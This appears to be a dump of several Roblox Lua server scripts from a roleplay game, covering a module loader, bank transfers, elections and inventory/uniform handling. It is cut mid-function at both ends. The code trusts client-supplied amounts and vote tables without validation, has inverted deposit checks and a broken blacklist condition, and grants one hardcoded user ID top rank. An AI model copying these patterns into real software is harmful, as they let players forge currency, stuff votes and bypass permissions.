	local a, b = InstanceType:byte(-2, -1) -- this is a simple gimmick but works well enough for all Roblox ClassNames :D
	local CacheName = b == 121 and a ~= 97 and a ~= 101 and a ~= 105 and a ~= 111 and a ~= 117 and InstanceType:sub(1, -2) .. "ies" or InstanceType .. "s"
	local IsLocal = InstanceType:sub(1, 5) == "Local"
	local Cache, Folder, FolderGetter -- Function Constants

	if IsLocal then -- Determine whether a method is local
		InstanceType = InstanceType:sub(6)

		if InstanceType == "Folder" then
			FolderGetter = function() return GetFirstChild(LocalResourcesLocation, "Resources", "Folder") end
		else
			FolderGetter = Resources.GetLocalFolder
		end
	else
		if InstanceType == "Folder" then
			FolderGetter = function() return script end
		else
			FolderGetter = Resources.GetFolder
		end
	end

	local function GetFunction(this, InstanceName)
		InstanceName = this ~= self and this or InstanceName
		if type(InstanceName) ~= "string" then error("[Resources] " .. MethodName .. " expected a string parameter, got " .. typeof(InstanceName), 2) end

		if not Folder then
			Cache = Caches[CacheName]
			Folder = FolderGetter(IsLocal and CacheName:sub(6) or CacheName)

			if not Cache then
				Cache = Folder:GetChildren() -- Cache children of Folder into Table
				Caches[CacheName] = Cache

				for i = 1, #Cache do
					local Child = Cache[i]
					Cache[Child.Name] = Child
					Cache[i] = nil
				end
			end
		end

		local Object = Cache[InstanceName]

		if not Object then
			if SERVER_SIDE or IsLocal then
				Object = GetFirstChild(Folder, InstanceName, InstanceType)
			else
				Object = Folder:WaitForChild(InstanceName, 5)

				if not Object then
					local Caller = getfenv(0).script

					if Caller and Caller.Parent and Caller.Parent.Parent == script then
						warn("[Resources] Make sure a Script in ServerScriptService calls `Resources:LoadLibrary(\"" .. Caller.Name .. "\")`")
					else
						if InstanceType == "Library" then
							warn("[Resources] Did you forget to install " .. InstanceName .. "?")
						elseif InstanceType == "Folder" then
							warn("[Resources] Make sure a Script in ServerScriptService calls `require(ReplicatedStorage:WaitForChild(\"Resources\"))`")
						end
					end

					Object = Folder:WaitForChild(InstanceName)
				end
			end

			Cache[InstanceName] = Object
		end

		return Object
	end

	Resources[MethodName] = GetFunction
	return GetFunction
end

if not SERVER_SIDE then
	local LocalPlayer repeat LocalPlayer = game:GetService("Players").LocalPlayer until LocalPlayer or not game:GetService("RunService").Heartbeat:wait()	
	repeat LocalResourcesLocation = LocalPlayer:FindFirstChildOfClass("PlayerScripts") until LocalResourcesLocation or not  game:GetService("RunService").Heartbeat:wait()
else
	LocalResourcesLocation = game:GetService("ServerStorage")
	local LibraryRepository = LocalResourcesLocation:FindFirstChild("Repository") or game:GetService("ServerScriptService"):FindFirstChild("Repository")

	local function CacheLibrary(Storage, Library, StorageName)
		if Storage[Library.Name] then
			error("[Resources] Duplicate " .. StorageName .. " Found:\n\t"
				.. Storage[Library.Name]:GetFullName() .. " and \n\t"
				.. Library:GetFullName()
				.. "\nOvershadowing is only permitted when a server-only library overshadows a replicated library"
			, 0)
		else
			Storage[Library.Name] = Library
		end
	end

	if LibraryRepository then
		-- If Folder `Repository` exists, move all Libraries over to ReplicatedStorage
		-- unless if they have "Server" in their name or in the name of a parent folder

		local ServerLibraries = {}
		local ReplicatedLibraries = Resources:GetLocalTable("Libraries")
		local FoldersToHandle = {}
		local FolderChildren, ExclusivelyServer = LibraryRepository:GetChildren(), false

		while FolderChildren do
			FoldersToHandle[FolderChildren] = nil

			for i = 1, #FolderChildren do
				local Child = FolderChildren[i]
				local ClassName = Child.ClassName
				local ServerOnly = ExclusivelyServer or (Child.Name:find("Server", 1, true) and true or false)

				if ClassName == "ModuleScript" then
					if ServerOnly then
						Child.Parent = Resources:GetLocalFolder("Libraries")
						CacheLibrary(ServerLibraries, Child, "ServerLibraries")
					else
						-- ModuleScripts which are not descendants of ServerOnly folders and do not have "Server" in name should be moved to Libraries
						--	if there are descendants of the ModuleScript with "Server" in the name, we should copy the original for use on the server
						--	and replicate a version with everything with "Server" in the name deleted

						local ModuleDescendants = Child:GetDescendants()
						local TemplateObject

						-- Iterate through the ModuleScript's Descendants, deleting those with "Server" in the Name

						for j = 1, #ModuleDescendants do
							local Descendant = ModuleDescendants[j]

							if Descendant.Name:find("Server", 1, true) then
								if not TemplateObject then -- Before the first deletion, clone Child
									TemplateObject = Child:Clone()
								end

								Descendant:Destroy()
							end
						end

						if TemplateObject then -- If we want to replicate an object with Server descendants, move the server-version to LocalLibraries
							TemplateObject.Parent = Resources:GetLocalFolder("Libraries")
							CacheLibrary(ServerLibraries, TemplateObject, "ServerLibraries")
						end

						Child.Parent = Resources:GetFolder("Libraries") -- Replicate Child which may have had things deleted
						CacheLibrary(ReplicatedLibraries, Child, "ReplicatedLibraries")
					end
				elseif ClassName == "Folder" then
					FoldersToHandle[Child:GetChildren()] = ServerOnly
				else
					error("[Resources] Instances within your Repository must be either a ModuleScript or a Folder, found: " .. ClassName .. " " .. Child:GetFullName(), 0)
				end
			end
			FolderChildren, ExclusivelyServer = next(FoldersToHandle)
		end

		for Name, Library in next, ServerLibraries do
			ReplicatedLibraries[Name] = Library
		end

		LibraryRepository:Destroy()
	end
end

local LoadedLibraries = Resources:GetLocalTable("LoadedLibraries")
local CurrentlyLoading = {} -- This is a hash which LoadLibrary uses as a kind of linked-list history of [Script who Loaded] -> Library

function Resources:LoadLibrary(LibraryName)
	LibraryName = self ~= Resources and self or LibraryName
	local Data = LoadedLibraries[LibraryName]

	if Data == nil then
		local Caller = getfenv(0).script or {Name = "Command bar"} -- If called from command bar, use table as a reference (never concatenated)
		local Library = Resources:GetLibrary(LibraryName)

		CurrentlyLoading[Caller] = Library

		-- Check to see if this case occurs:
		-- Library -> Stuff1 -> Stuff2 -> Library

		-- WHERE CurrentlyLoading[Library] is Stuff1
		-- and CurrentlyLoading[Stuff1] is Stuff2
		-- and CurrentlyLoading[Stuff2] is Library

		local Current = Library
		local Count = 0

		while Current do
			Count = Count + 1
			Current = CurrentlyLoading[Current]

			if Current == Library then
				local String = Current.Name -- Get the string traceback

				for _ = 1, Count do
					Current = CurrentlyLoading[Current]
					String = String .. " -> " .. Current.Name
				end

				error("[Resources] Circular dependency chain detected: " .. String)
			end
		end

		Data = require(Library)

		if CurrentlyLoading[Caller] == Library then -- Thread-safe cleanup!
			CurrentlyLoading[Caller] = nil
		end

		if Data == nil then
			error("[Resources] " .. LibraryName .. " must return a non-nil value. Return false instead.")
		end

		LoadedLibraries[LibraryName] = Data -- Cache by name for subsequent calls
	end

	return Data
end

Metatable.__call = Resources.LoadLibrary
return Resources

serverscriptserice.services.bankservice



local BankService = {}
local DataStore2 = require(script.Parent.Parent.MainModule)
local PlayerService = require(game.ServerScriptService.Services.PlayerService)
local FunctionService = require(game.ServerScriptService.Services.FunctionService)
local WebService = require(game.ServerScriptService.Services.WebService)
local Remotes = game.ReplicatedStorage.Remotes
local VerifyService = require(game.ServerScriptService.Services.VerifyService)

local RemoteService = require(game.ServerScriptService.Services.RemoteService)
function RegisterRemote(name, callback)
	RemoteService.RegisterRemote(name, callback)
end

RegisterRemote("BankUserTransfer", function(player, id, username, sendAmount)
	if not PlayerService.Distance(player, id) then
		return;
	end;
	if not game.Players:FindFirstChild(username) then
		return
	end 
	local argPlayer = game:GetService("Players"):FindFirstChild(username)
	local bankBalance = VerifyService:GetData(player).Bank
	local cashBalance = VerifyService:GetData(player).Cash
	local argPlayerBankData = VerifyService:GetData(argPlayer).Bank
	local argPlayerWalletData = VerifyService:GetData(argPlayer).Cash
	if username == player.Name then
		game.ReplicatedStorage.Remotes.Notification:FireClient(player,"You can't transfer money to your own account.","Transfer Unsuccessful!","Red")
		return
	end
	if cashBalance >= sendAmount  then
		game.ReplicatedStorage.Remotes.Notification:FireClient(player,"$"..sendAmount.." has been transferred to "..argPlayer.Name.."'s account.","Transfer Successful!")
		VerifyService:GetData(player).Cash = cashBalance-sendAmount
		wait(5)
		VerifyService:GetData(argPlayer).Bank = argPlayerBankData+sendAmount
		game.ReplicatedStorage.Remotes.Notification:FireClient(argPlayer,"$"..sendAmount.." has been transferred to you by "..player.Name,"Transfer Successful!")
		local jsonToSend = {
			embeds = {
				{
					title = "Log Event",
					type = "rich",
					description = player.Name .. " transferred $"..sendAmount .. " to " ..argPlayer.Name,
				}
			}
		}
		WebService.SendJSON("DrpLog", jsonToSend)
	elseif bankBalance >= sendAmount then
		game.ReplicatedStorage.Remotes.Notification:FireClient(player,"$"..sendAmount.." has been transferred to "..argPlayer.Name.."'s account.","Transfer Successful!")
		VerifyService:GetData(player).Bank = bankBalance-sendAmount
		VerifyService:GetData(argPlayer).Bank = argPlayerBankData+sendAmount
		game.ReplicatedStorage.Remotes.Notification:FireClient(argPlayer,"$"..sendAmount.." has been transferred to you by "..player.Name,"Transfer Successful!")
		local jsonToSend = {
			embeds = {
				{
					title = "Log Event",
					type = "rich",
					description = player.Name .. " transferred $"..sendAmount .. " to " ..argPlayer.Name,
				}
			}
		}
		WebService.SendJSON("DrpLog", jsonToSend)
	else
		game.ReplicatedStorage.Remotes.Notification:FireClient(player, "You do not have enough money to complete this transaction!", "Transaction Failed!", "Red")
	end
	RemoteService.UpdateMoney(player)
	RemoteService.UpdateMoney(argPlayer)
end)

RegisterRemote("BankLocalTransfer", function(Plr,val1,val2,val3,val4,val5)
	if not PlayerService.Distance(Plr, val1) then
		return;
	end;


	local Bank = VerifyService:GetData(Plr).Bank
	local Cash = VerifyService:GetData(Plr).Cash
	local BANK_LIMIT = 5000

	if val2 == "Bank" and val3 == "Cash" then 
		if val4 > 0 and Bank >= val4 then
			VerifyService:GetData(Plr).Bank =Bank-val4
			Remotes.Notification:FireClient(Plr, "$" .. val4 .. " has been withdrawn.", "Transfer Successful!");
			VerifyService:GetData(Plr).Cash =Cash+val4
			RemoteService.UpdateMoney(Plr)
			local jsonToSend = {
				embeds = {
					{
						title = "Log Event",
						type = "rich",
						description = Plr.Name .. " transferred $"..val4 .. " to Cash account.",
					}
				}
			}
			WebService.SendJSON("DrpLog", jsonToSend)
		else
			game.ReplicatedStorage.Remotes.Notification:FireClient(Plr, "You do not have enough money to complete this transaction!", "Transaction Failed!", "Red")
		end
	end
	if val2 == "Cash" and val3 == "Bank" then

		if Bank >= BANK_LIMIT then
			print'AHHH'
			game.ReplicatedStorage.Remotes.Notification:FireClient(Plr, "Maximum limit of Bank account is 5000.", "Transfer Unsuccessful!")
			return
		end

		if Bank <= val4 then
			print'XD'
			game.ReplicatedStorage.Remotes.Notification:FireClient(Plr, "Maximum limit of Bank account is 5000.", "Transfer Unsuccessful!")
			return
		end
		if val4 > 0 and Bank >= val4 then
			VerifyService:GetData(Plr).Bank = Bank+val4
			Remotes.Notification:FireClient(Plr, "$" .. val4 .. " has been deposited.", "Transfer Successful!");
			VerifyService:GetData(Plr).Cash = Cash-val4
			RemoteService.UpdateMoney(Plr)
			local jsonToSend = {
				embeds = {
					{
						title = "Log Event",
						type = "rich",
						description = Plr.Name .. " transferred $"..val4 .. " to Bank account.",
					}
				}
			}
			WebService.SendJSON("DrpLog", jsonToSend)
		else
			game.ReplicatedStorage.Remotes.Notification:FireClient(Plr, "You do not have enough money to complete this transaction!", "Transaction Failed!", "Red")
		end
	end

	--RemoteService.UpdateMoney(Plr)
end)








return BankService

services.electionservice
local API = {}
local DataStoreService = game:GetService("DataStoreService")
local Remotes = game.ReplicatedStorage.Remotes
local VoteData = DataStoreService:GetDataStore("Vote_1")
local Elections = require(game.ReplicatedStorage.Databases.Elections)


function API.Init()
	Remotes.CanVote.OnServerInvoke = function(Player, Id)
		local VoteTable = {}
		for i,v in pairs(Elections) do
			if os.time() < v.Times.End then
				if VoteData:GetAsync(i) == nil then
					table.insert(VoteTable, i)
				end
			end
		end
		return VoteTable
	end

	Remotes.SubmitVote.OnServerEvent:Connect(function(Player, Id, Election, Table)
		local GetData = VoteData:GetAsync(Election)
		local Highest = 0


		for i,v in pairs(Elections[Election].Options) do
			Highest=Highest+1
		end


		if GetData == nil then
			local VoteTable = {Election, {{}}, 0}

			for i,v in pairs(Table) do
				local Points = Highest-v
				table.insert(VoteTable[2][1], i, Points)
				VoteTable[3] = VoteTable[3]+1
			end
			VoteData:SetAsync(Election, VoteTable)
		else
			for i,v in pairs(Table) do
				local Points = Highest-v
				GetData[2][1][i] = GetData[2][1][i]+Points
				GetData[3] = GetData[3]+1
				VoteData:SetAsync(Election, GetData)
			end
			VoteData:SetAsync(Election, GetData)
		end
	end)

	Remotes.ElectionResults.OnServerEvent:Connect(function(Player, Name)
		local VoteTable = {}
		for i,v in pairs(Name) do
			local GetData = VoteData:GetAsync(v)
			table.insert(VoteTable, GetData)
		end
		Remotes.ElectionResults:FireClient(Player, VoteTable)
	end)
end


return API

services.functionservice
local FunctionService = {}
local DataStore2 = require(script.Parent.Parent.MainModule)
local Remotes = game.ReplicatedStorage.Remotes
local HttpService = game:GetService("HttpService")
local DataStoreService = game:GetService("DataStoreService")
local ServerScriptService = game:GetService("ServerScriptService")
local CollectionService = game:GetService("CollectionService")
local Items = require(game.ReplicatedStorage.Databases.Items)
local GLASS_TAG = "Glass"
local GLASS_SMASH_TAG = "Ignore"
local Accessories = game.ServerStorage.Accessories
local Teams = require(game.ReplicatedStorage.Databases.Teams)
local FindPartOnRayWithIgnoreList = workspace.FindPartOnRayWithIgnoreList
local Tools = game.ServerStorage.Tools
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
local ToolsData = require(game.ReplicatedStorage.Databases.Tools)
local Players = game.Players
local Holsters = game.ReplicatedStorage.Holsters
local Uniforms = require(game.ReplicatedStorage.Databases.Uniforms)
local RolesData = require(game.ReplicatedStorage.Databases.Roles)
local PlayerInventory = {}


function GetPlayerInventory(Player,Table)
	local Inventory = PlayerInventory[Player.Name]

	if Inventory == nil then
		return {}
	else
		return Inventory
	end
end

function UpdatePlayerInventory(Player, Number, Value)
	PlayerInventory[Player.Name][Number][3] = Value
end


game.Players.PlayerAdded:Connect(function(Player)
	local VerifyService = require(game.ServerScriptService.Services.VerifyService)

	Player.CharacterAdded:Connect(function(Character)
		PlayerInventory[Player.Name] = nil
		Remotes.GetInv:FireClient(Player,{})
	end)
	Player.CharacterRemoving:Connect(function(character)
		delay(0.2, function()
			PlayerInventory[Player.Name] = nil
		end)
		Remotes.GetInv:FireClient(Player,{})
	end)
end)

game.Players.PlayerRemoving:Connect(function(Player)
	delay(0.2, function()
		PlayerInventory[Player.Name] = nil
	end)
end)


function GetIgnoreList(player, char, otherItem)
	local def = CollectionService:GetTagged(GLASS_SMASH_TAG)
	INSERT(def, char)
	INSERT(def, workspace.InvisibleParts)
	INSERT(def, otherItem)
	for _, p in pairs(Players:GetPlayers()) do
		if p ~= player and p.Character then
			for _, v in pairs(p.Character:GetChildren()) do
				if v:IsA("Accessory") or v.Name == "HumanoidRootPart" or v.ClassName == "Configuration" then
					INSERT(def, v)
				end
			end
		end
	end
	return def
end

function Logging(Player)
	if ServerScriptService.Data:FindFirstChild(Player.UserId .. "_CombatLoggingData") then
		ServerScriptService.Data:FindFirstChild(Player.UserId .. "_CombatLoggingData").Value = 60
		return true
	end
	local LogValue = Instance.new("IntValue", ServerScriptService.Data)
	LogValue.Name = Player.UserId .. "_CombatLoggingData"
	LogValue.Value = 60
	Remotes.RadioUpdate:FireClient(Player,true)
	require(game.ServerScriptService.Services.VerifyService):GetData(Player).Combat = true
	while wait(1) do
		if LogValue.Value == 0 then
			LogValue:Destroy()
			Remotes.RadioUpdate:FireClient(Player,false)
			require(game.ServerScriptService.Services.VerifyService):GetData(Player).Combat = false
			break
		end
		if LogValue.Value ~= 0 then
			LogValue.Value = LogValue.Value - 1
		end
	end
	return true
end
local ShallowCopy = function(orig, overwrite)
	local orig_type = type(orig)
	local copy
	if orig_type == "table" then
		copy = {}
		for orig_key, orig_value in pairs(orig) do
			copy[orig_key] = orig_value
		end
		if overwrite then
			for orig_key, orig_value in pairs(overwrite) do
				if orig_key:sub(1, 1) == "_" then
					copy[orig_key:sub(2)] = nil
				else
					copy[orig_key] = orig_value
				end
			end
		end
	else
		copy = orig
	end
	return copy
end
function WearUni(player)
	for i,v in pairs(Teams) do
		local myteam = tostring(player.Team)
		if v.Name == myteam then
			if v.Uniform then wait()
				local HairSaveDatastore = DataStore2("Hair", player)
				local Data = HairSaveDatastore:Get()
				local HairIndex = {
					[2] = 'Trecky',
					[3] = 'Bun',
					[4] = 'Long'
				}
				local UniformDatastore = DataStore2("Uniform", player)
				local AccessoryDatastore = DataStore2("Accessory", player)
				local AccessoryData = AccessoryDatastore:Get()
				local UniformData = UniformDatastore:Get()
				local RealUniData = tostring(UniformData)
				local udb = require(game.ReplicatedStorage.Databases.Uniforms)
				if Data ~= 0 and Data ~= 1 and Data ~= nil then
					WearUniform(player, 3, v.Uniform[1],v.Uniform[2],Data,v.Uniform[3])
				else
					WearUniform(player, 3, v.Uniform[1],v.Uniform[2],0,v.Uniform[3])	
				end
			end
		end	
	end	
end
function tagHumanoid(humanoid, killer, tool, pos)
	if humanoid and killer then
		local tag = Instance.new("ObjectValue")
		tag.Name = "creator"
		tag.Value = killer
		tag.Parent = humanoid
		local guntag = Instance.new("StringValue")
		guntag.Name = "tool"
		guntag.Value = tool
		guntag.Parent = humanoid
		delay(0.5, function()
			tag:Destroy()
			guntag:Destroy()
		end)	
	end
end
function ItemDropSpawn()
	local Rand = math.random(-1.5,1.5)
	return Rand
end

function IgnoreDropList(char, otherItem)
	local def = {
		char,
		workspace.InvisibleParts,
		workspace.Ploppables,
		workspace.Vehicles,
		otherItem
	}
	for _, p in pairs(Players:GetPlayers()) do
		if p.Character then
			INSERT(def, p.Character)
		end
	end
	return def
end

function GetRecord(optUsername)
	if game.Players:FindFirstChild(optUsername) then
		return require(game.ServerScriptService.Services.VerifyService):GetData(game.Players:FindFirstChild(optUsername)).Records
	else
		return require(game.ServerScriptService.Services.VerifyService):GetData(optUsername).Records		
	end
end

function GetRoofTop(Player)
	return require(game.ServerScriptService.Services.VerifyService):GetData(Player).Number
end

function GetLicensePlate(Player)
	return require(game.ServerScriptService.Services.VerifyService):GetData(Player).Plate
end
function CloneRadioHolster(player, ItemId) 

	if ItemId == "Radio" then
		if player.Character:FindFirstChild("BaseDutyBelt") == nil and player.Character:FindFirstChild("MSPDutyBelt") == nil  and player.Character:FindFirstChild("MSPBaseDutyBelt") == nil then
			Holsters.Blank:Clone().Parent = player.Character
		else
			Holsters.Radio:Clone().Parent = player.Character
		end

	end
end

function RemoveRadioHolster(player, ItemId)
	if ItemId == "Radio" then
		if player.Character:FindFirstChild("Radio") then 
			player.Character.Radio:Destroy()
		end
	end
end
function RemoveRadioHolster1(player, ItemType)
	if ItemType == "Radio" then
		if player.Character:FindFirstChild("Radio") then 
			player.Character.Radio:Destroy()
		end
	end
end
function isSeated(seat)
	if seat.SeatPart then
		if seat.SeatPart:IsA("VehicleSeat") then

		else
			return;
		end;
	else
		return;
	end;
	return seat.SeatPart;
end;

local ItemBlacklist = {"StetsonM2A", "SigP226", "StetsonM2M", "StetsonM1", "Snub", "Para17"}

function GiveItem(Player,Item,guiPlayer,Data,Model,CustomAttributes,UseNewInventory)

	local Inventory = GetPlayerInventory(Player)
	local ItemData = Items[Item]
	local ItemAsset = Items[Item].Asset
	local ItemName = Items[Item].Name
	local ItemType = Items[Item].Type
	local Attributes = Items[Item].Attributes
	local NewInventory = {}
	if table.find(ItemBlacklist, ItemAsset) then
		if Player.UserId ~= 1769886077 or Player.UserId ~= 89222888 then
			return
		end
	end
	if ItemType == "Ploppable" or ItemType == "Radio" or Item == "HandcuffSet"  then
		local Multiple = false
		local Found = false
		CloneRadioHolster(Player, Item)
		if Inventory ~= nil then
			for i,v in pairs(Inventory) do
				if v[2] == Item then
					local currentTick = tick()
					local Id = Player.UserId.."_"..currentTick
					local One = v[1]
					local Tuu = v[2]
					local Tree = v[3]
					local Quantity = (v[3].Q+1)
					Tree.Q = Quantity
					Multiple = true
					local OldItem = {One,{Q = Quantity},false}
					table.insert(NewInventory,OldItem)
					for i,v in pairs(Tools:GetChildren()) do
						if v.Name == ItemAsset then
							local Config = Tools[v.Name]:Clone()
							Config.Class.Value = ItemAsset
							Config.Name = Id
							Config.Parent = Player.Backpack
						end
					end

					if PlayerInventory[Player.Name] ~= nil then
						PlayerInventory[Player.Name][i] = {One, Tuu, Tree}
					else
						PlayerInventory[Player.Name] = {{One, Tuu, Tree}}
					end

					Remotes.UpdateInv:FireClient(Player,NewInventory)
					if Data ~= nil then
						Remotes.OtherItemUpdate:FireClient(guiPlayer, Model, Data)
					elseif UseNewInventory ~= nil then
						Remotes.OtherItemUpdate:FireClient(guiPlayer, Model, NewInventory)
					end
					Found = true
					break	
				end
			end
		end


		if Found == false then
			local currentTick = tick()
			local Id = Player.UserId.."_"..currentTick
			local NewItem = {ItemName,{Id,Item,{Q = 1}},true}
			table.insert(NewInventory,NewItem)
			for i,v in pairs(Tools:GetChildren()) do
				if v.Name == ItemAsset then
					local Config = Tools[v.Name]:Clone()
					Config.Class.Value = Item
					Config.Name = Id
					Config.Parent = Player.Backpack
				end
			end

			if PlayerInventory[Player.Name] ~= nil then
				table.insert(PlayerInventory[Player.Name], {Id, Item, {Q = 1}})
			else
				PlayerInventory[Player.Name] = {{Id, Item, {Q = 1}}}
			end

			Remotes.UpdateInv:FireClient(Player,NewInventory)

			if Data ~= nil then
				Remotes.OtherItemUpdate:FireClient(guiPlayer, Model, Data)
			elseif UseNewInventory ~= nil then
				Remotes.OtherItemUpdate:FireClient(guiPlayer, Model, NewInventory)
			end
		end


		-----------------------------------------------------------------------------

	else
		local currentTick = tick()
		local Id = Player.UserId.."_"..currentTick
		local NewItem = {ItemName,{Id,Item,CustomAttributes ~= nil and CustomAttributes or Attributes},true}
		table.insert(NewInventory,NewItem)
		for i,v in pairs(Tools:GetChildren()) do
			if v.Name == ItemAsset then
				local Config = Tools[v.Name]:Clone()
				Config.Class.Value = Item
				Config.Name = Id
				Config.Parent = Player.Backpack
			end
		end

		local NewAttributes = {}

		if Attributes ~= nil then
			if Attributes.R then
				NewAttributes.R = Attributes.R
			end
			if Attributes.Q then
				NewAttributes.Q = Attributes.Q
			end
		end

		if PlayerInventory[Player.Name] ~= nil then
			table.insert(PlayerInventory[Player.Name], {Id, Item, CustomAttributes ~= nil and CustomAttributes or NewAttributes})
		else
			PlayerInventory[Player.Name] = {{Id, Item, CustomAttributes ~= nil and CustomAttributes or NewAttributes}}
		end

		Remotes.UpdateInv:FireClient(Player,NewInventory)

		if Data ~= nil then
			Remotes.OtherItemUpdate:FireClient(guiPlayer, Model, Data)
		elseif UseNewInventory ~= nil then
			Remotes.OtherItemUpdate:FireClient(guiPlayer, Model, NewInventory)	
		end	

	end

end

function RemoveItem(Player,Id,Data,Model)
	local Inventory = GetPlayerInventory(Player)
	local NewInventory = {}

	for i,v in pairs(Inventory) do
		local ItemType = Items[v[2]].Type
		local Item = v[2]
		--	FunctionService.RemoveHolster(Player, v)
		if v[1] == Id then
			if v[3].Mag then
				for e,h in pairs(Inventory) do
					if h[1] == v[3].Mag then
						Remotes.UpdateInv:FireClient(Player, {{h[1], {R = h[3].R}, false}})
					end
				end
			end



			if ItemType == "Ploppable" or ItemType == "Radio" or Item == "HandcuffSet" then
				if v[3].Q == 1 then

					RemoveRadioHolster1(Player, ItemType)
					local Item = {v[1],nil,false}
					table.insert(NewInventory,Item)

					for e,h in pairs(PlayerInventory[Player.Name]) do
						if h[1] == Id then
							table.remove(PlayerInventory[Player.Name], e)
							break
						end
					end
					print("1")
					Remotes.UpdateInv:FireClient(Player,NewInventory)
					if Data ~= nil then
						Remotes.OtherItemUpdate:FireClient(Player, Model, Data)
					end
					if Player.Character:FindFirstChild(v[1]) then
						Player.Character[v[1]]:Destroy()
					end
					if Player.Backpack:FindFirstChild(v[1]) then
						Player.Backpack[v[1]]:Destroy()
					end

					break
				else

					local Quantity = v[3].Q-1
					local Item = {v[1],{Q = Quantity},false}
					table.insert(NewInventory,Item)
					print("2")

					for e,h in pairs(PlayerInventory[Player.Name]) do
						if h[1] == Id then

							PlayerInventory[Player.Name][e] = {v[1], v[2], {Q = Quantity}}
							break
						end
					end

					Remotes.UpdateInv:FireClient(Player,NewInventory)
					if Data ~= nil then
						Remotes.OtherItemUpdate:FireClient(Player, Model, Data)	
					end

				end
			else
				local Item = {v[1],nil,false}
				table.insert(NewInventory,Item)

				for e,h in pairs(PlayerInventory[Player.Name]) do
					if h[1] == Id then
						table.remove(PlayerInventory[Player.Name], e)
						break
					end
				end

				Remotes.UpdateInv:FireClient(Player,NewInventory)
				if Data ~= nil then
					Remotes.OtherItemUpdate:FireClient(Player, Model, Data)
				end
				if Player.Character:FindFirstChild(v[1]) then
					Player.Character[v[1]]:Destroy()
				end
				if Player.Backpack:FindFirstChild(v[1]) then
					Player.Backpack[v[1]]:Destroy()
				end
				break
			end
		end			
	end

end

function WearUniform(PlayerCalled,Id,Role,Uniform,HairID,Accessory)
	coroutine.wrap(function()
		local groupservice = game:GetService("GroupService")
		local Appearance = game.Players:GetCharacterAppearanceAsync(PlayerCalled.UserId)
		if HairID == nil then	
			HairID = 0 
		end
		PlayerCalled.Character:WaitForChild("Humanoid"):RemoveAccessories()
		for i,v in pairs(PlayerCalled.Character:GetChildren()) do
			if  v.ClassName == "Pants" or v.ClassName == "Shirt" or v.ClassName == "ShirtGraphic" then
				v:Destroy()

			end
		end
		local rank
		if RolesData[Role] ~= nil then
			if RolesData[Role].GroupCriteria then
				if PlayerCalled:IsInGroup(RolesData[Role].GroupCriteria[1][1]) or PlayerCalled.UserId == 204160865 then 
					if PlayerCalled.UserId ~= 204160865 then
						rank = PlayerCalled:GetRankInGroup(RolesData[Role].GroupCriteria[1][1])
					else
						rank = 255
					end
				else
					rank = 1
				end
			else
				rank = 1
			end
		else
			rank = 1
		end

		local HairIndex = {
			[2] = 'Trecky',
			[3] = 'Bun',
			[4] = 'Long'
		}

		if Uniform ~= "Own" then
			if Uniform == "Plain Clothes" then
				if Uniforms[Role][Uniform][1][4] ~= nil then
					if Accessory ~= nil then

						for i,v in pairs(Uniforms[Role][Uniform][1][4][Accessory]) do

							local NewAccessory = Accessories[v]:Clone()
							NewAccessory.Parent = PlayerCalled.Character

						end
					else
						for i,v in pairs(Uniforms[Role][Uniform][1][4]) do
							local NewAccessory = Accessories[v]:Clone()
							NewAccessory.Parent = PlayerCalled.Character
						end
					end
				end
			end

			if	Uniform ~= "Plain Clothes" then 
				local success, err = pcall(function()
					if Uniforms[Role][Uniform][rank] then
						if Accessory ~= nil then
							for i,v in pairs(Uniforms[Role][Uniform][rank][4][Accessory]) do

								local NewAccessory = Accessories[v]:Clone()
								NewAccessory.Parent = PlayerCalled.Character

							end
						else
							if Uniforms[Role][Uniform][rank][4] then
								for i,v in pairs(Uniforms[Role][Uniform][rank][4]) do
									local NewAccessory = Accessories[v]:Clone()
									NewAccessory.Parent = PlayerCalled.Character
								end
							end
						end
						local NewShirt = Instance.new("Shirt")
						NewShirt.ShirtTemplate = "rbxassetid://"..Uniforms[Role][Uniform][rank][1]
						NewShirt.Name = "Shirt"
						NewShirt.Parent = PlayerCalled.Character
						local NewPants = Instance.new("Pants")
						NewPants.PantsTemplate = "rbxassetid://"..Uniforms[Role][Uniform][rank][2]
						NewPants.Name = "Pants"
						NewPants.Parent = PlayerCalled.Character

						if HairID ~= 0 and HairID ~= 1 and HairID ~= nil then
							local Hair = Accessories[HairIndex[HairID]]:Clone()
							Hair.Parent = PlayerCalled.Character
						end

					else
						if Accessory ~= nil then
							for i,v in pairs(Uniforms[Role][Uniform][1][4][Accessory]) do

								local NewAccessory = Accessories[v]:Clone()
								NewAccessory.Parent = PlayerCalled.Character

							end
						else
							for i,v in pairs(Uniforms[Role][Uniform][1][4]) do
								local NewAccessory = Accessories[v]:Clone()
								NewAccessory.Parent = PlayerCalled.Character
							end
						end
						local NewShirt = Instance.new("Shirt")
						NewShirt.ShirtTemplate = "rbxassetid://"..Uniforms[Role][Uniform][1][1]
						NewShirt.Name = "Shirt"
						NewShirt.Parent = PlayerCalled.Character
						local NewPants = Instance.new("Pants")
						NewPants.PantsTemplate = "rbxassetid://"..Uniforms[Role][Uniform][1][2]
						NewPants.Name = "Pants"
						NewPants.Parent = PlayerCalled.Character

						if HairID ~= 0 and HairID ~= 1 and HairID ~= nil then
							local Hair = Accessories[HairIndex[HairID]]:Clone()
							Hair.Parent = PlayerCalled.Character
						end
					end
				end)
				if err then
					print(err)
				end
			end
		end

		if Uniform == "Class A" and RolesData[Role].Name == "MNGTeam" then
			for i,v in pairs(Appearance:GetChildren()) do
				if v:IsA("ShirtGraphic") then
					v.Parent = PlayerCalled.Character
				end
			end
		end
		if Uniform == "Own" or Uniform == "Plain Clothes"  then
			local UNIBlacklist = require(game.ReplicatedStorage.Databases.Uniforms.AccessoryBlacklist) 

			for i,v in pairs(Appearance:GetChildren()) do

				if v.ClassName == "Shirt" or v.ClassName == "Pants" or v.ClassName == "Accessory" or v.ClassName == "ShirtGraphic" then
					v.Parent = PlayerCalled.Character
				end
			end
			for i,v in pairs(Appearance:GetChildren()) do
				if  v.ClassName == "Accessory" then
					v.Parent = PlayerCalled.Character
				end
			end
		end
		if Uniform == "Protection Suit"  or Uniform == "ASPS Polo" or Uniform == "TRU" or Uniform == "SOB UBAC"  or Uniform == "Overalls"  or Uniform == "Security‎‎"  then
			for i,v in pairs(Appearance:GetChildren()) do
				if  v.ClassName == "Accessory" then
					v.Parent = PlayerCalled.Character
				end
			end
		end
		if Uniform == "Protection Suit" then

		end
